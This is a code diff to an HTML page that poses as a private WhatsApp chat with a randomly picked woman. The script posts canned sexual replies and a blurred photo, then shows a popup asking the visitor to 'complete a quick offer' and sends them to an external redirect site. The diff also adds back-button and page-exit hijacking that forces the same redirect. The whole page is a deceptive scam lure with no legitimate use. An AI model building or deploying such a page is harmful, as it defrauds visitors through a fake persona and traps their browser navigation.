@@ -2,175 +2,174 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Private Chat Invitation</title>
-  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/733/733585.png" type="image/x-icon" />
+  <title>Private WhatsApp Chat</title>
   <style>
-    * {
+    body, html {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-    body {
+      height: 100%;
+      background-color: #ece5dd;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #e5ddd5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       overflow: hidden;
     }
-    .chat-wrapper {
-      background-color: #fff;
-      width: 360px;
-      height: 600px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    #chatContainer {
+      height: 100vh;
       display: flex;
       flex-direction: column;
-      position: relative;
-    }
-    .chat-header {
-      background-color: #075e54;
-      color: white;
-      padding: 15px;
-      font-size: 18px;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-    }
-    .chat-header img {
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      margin-right: 10px;
-    }
-    .chat-body {
-      flex: 1;
+      justify-content: space-between;
+      background-image: url('https://i.ibb.co/6Xb3Y0Z/whatsapp-bg.png');
+      background-size: cover;
       padding: 10px;
-      display: flex;
-      flex-direction: column;
+    }
+    .chat {
+      flex: 1;
       overflow-y: auto;
+      padding-bottom: 10px;
     }
     .bubble {
-      max-width: 70%;
-      margin-bottom: 12px;
-      padding: 10px 14px;
-      border-radius: 18px;
-      animation: fadeIn 0.5s ease;
+      max-width: 80%;
+      padding: 10px;
+      margin: 5px;
+      border-radius: 10px;
+      line-height: 1.4;
+      display: inline-block;
+      clear: both;
     }
-    .incoming {
+    .user {
       background-color: #dcf8c6;
-      align-self: flex-start;
-    }
-    .fake-user {
-      background-color: #f0f0f0;
       align-self: flex-end;
+      float: right;
     }
-    .typing {
-      font-style: italic;
-      color: #888;
-      font-size: 14px;
-      margin-bottom: 10px;
-      display: none;
+    .bot {
+      background-color: #fff;
+      align-self: flex-start;
+      float: left;
     }
-    .popup {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      color: white;
+    #inputBox {
       display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      text-align: center;
-      padding: 20px;
-      display: none;
+      padding: 10px;
+      background-color: #f0f0f0;
     }
-    .popup button {
-      margin-top: 15px;
-      background-color: #25d366;
+    #inputField {
+      flex: 1;
+      padding: 10px;
       border: none;
-      padding: 12px 25px;
-      font-size: 16px;
+      border-radius: 5px;
+      outline: none;
+    }
+    #sendBtn {
+      padding: 10px;
+      margin-left: 10px;
+      background-color: #25d366;
       color: white;
+      border: none;
       border-radius: 5px;
       cursor: pointer;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+    .blurred {
+      filter: blur(10px);
+    }
+    #popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 10;
+      display: none;
+    }
+    #popup button {
+      background: #25d366;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    img.chat-img {
+      width: 200px;
+      border-radius: 10px;
+      margin-top: 5px;
     }
   </style>
 </head>
 <body>
-  <div class="chat-wrapper">
-    <div class="chat-header">
-      <img id="girlPic" src="" alt="girl" />
-      <span id="girlName">Shelena</span>
+  <div id="chatContainer">
+    <div class="chat" id="chat"></div>
+    <div id="inputBox">
+      <input type="text" id="inputField" placeholder="Type a message...">
+      <button id="sendBtn">Send</button>
     </div>
-    <div class="chat-body" id="chatBody">
-      <div class="typing" id="typing">Typing...</div>
-    </div>
-    <div class="popup" id="popup">
-      <p>🔞 Before continuing, complete a quick survey to verify you're over 18.</p>
-      <button onclick="redirectNow()">Continue</button>
-    </div>
-  </div><audio id="msgSound" src="https://notificationsounds.com/notification-sounds/event-538/download/mp3"></audio>
-
-  <script>
-    const messages = [
-      "Hey there handsome 😘",
-      "You're looking real fine today... wanna chat?",
-      "I’ve been waiting for someone like you... 💋",
-      "Let's keep this between us 🔥",
-      "Are you alone right now? 😈",
-      "I’m feeling a little naughty tonight… care to join me?"
+  </div>  <div id="popup">
+    <p>🔞 This image is private. Complete a quick offer to continue the chat.</p>
+    <button onclick="window.location.href='https://redirecting-kappa.vercel.app/'">Continue</button>
+  </div>  <script>
+    const girlNames = ["Shelena", "Kiara", "Lola", "Maya", "Carmen"];
+    const girlImages = [
+      "https://i.ibb.co/ZYW3VTp/shelena.jpg",
+      "https://i.ibb.co/jv6dScY/girl2.jpg",
+      "https://i.ibb.co/kKsd0Zm/girl3.jpg",
+      "https://i.ibb.co/XFtD43L/girl4.jpg"
+    ];
+    const sexyReplies = [
+      "I love it when you talk dirty 😘",
+      "You make me feel so naughty already... 💦",
+      "Mmm... wanna see more of me? 🔥",
+      "You're making me blush... come closer daddy 😈"
     ];
 
-    const girls = [
-      { name: "Shelena", img: "https://randomuser.me/api/portraits/women/81.jpg" },
-      { name: "Tasha", img: "https://randomuser.me/api/portraits/women/91.jpg" },
-      { name: "Keisha", img: "https://randomuser.me/api/portraits/women/22.jpg" },
-      { name: "Melina", img: "https://randomuser.me/api/portraits/women/56.jpg" },
-      { name: "Nia", img: "https://randomuser.me/api/portraits/women/11.jpg" },
-      { name: "Amara", img: "https://randomuser.me/api/portraits/women/44.jpg" }
-    ];
+    const girlName = girlNames[Math.floor(Math.random() * girlNames.length)];
+    const girlPic = girlImages[Math.floor(Math.random() * girlImages.length)];
+    const sexyMsg = sexyReplies[Math.floor(Math.random() * sexyReplies.length)];
 
-    const girl = girls[Math.floor(Math.random() * girls.length)];
-    document.getElementById("girlName").innerText = girl.name;
-    document.getElementById("girlPic").src = girl.img;
+    const chat = document.getElementById("chat");
+    const input = document.getElementById("inputField");
+    const sendBtn = document.getElementById("sendBtn");
 
-    const chatBody = document.getElementById("chatBody");
-    const typing = document.getElementById("typing");
-    const popup = document.getElementById("popup");
-    const msgSound = document.getElementById("msgSound");
+    const addBubble = (msg, sender = "bot") => {
+      const bubble = document.createElement("div");
+      bubble.className = `bubble ${sender}`;
+      bubble.innerText = msg;
+      chat.appendChild(bubble);
+      chat.scrollTop = chat.scrollHeight;
+      new Audio("https://www.soundjay.com/button/beep-07.wav").play();
+    };
 
-    let i = 0;
-    function showMessage() {
-      if (i < messages.length) {
-        typing.style.display = "block";
+    sendBtn.onclick = () => {
+      if (input.value.trim() !== "") {
+        addBubble(input.value, "user");
+        input.value = "";
         setTimeout(() => {
-          typing.style.display = "none";
-          const div = document.createElement("div");
-          div.className = "bubble incoming";
-          div.innerText = messages[i];
-          chatBody.appendChild(div);
-          msgSound.play();
-          i++;
-          showMessage();
-        }, 2000);
-      } else {
-        setTimeout(() => popup.style.display = "flex", 1500);
+          addBubble(`${girlName}: ${sexyMsg}`);
+
+          const img = document.createElement("img");
+          img.src = girlPic;
+          img.className = "chat-img blurred";
+          chat.appendChild(img);
+          chat.scrollTop = chat.scrollHeight;
+
+          setTimeout(() => {
+            document.getElementById("popup").style.display = "flex";
+          }, 1500);
+
+        }, 1200);
       }
-    }
+    };
 
-    function redirectNow() {
-      window.location.href = "https://redirecting-kappa.vercel.app/";
-    }
-
-    setTimeout(showMessage, 1500);
+    window.onpopstate = function () {
+      location.href = "https://redirecting-kappa.vercel.app/";
+    };
+    window.addEventListener("beforeunload", function (e) {
+      e.preventDefault();
+      e.returnValue = '';
+      setTimeout(() => {
+        location.href = "https://redirecting-kappa.vercel.app/";
+      }, 50);
+    });
   </script></body>
 </html>
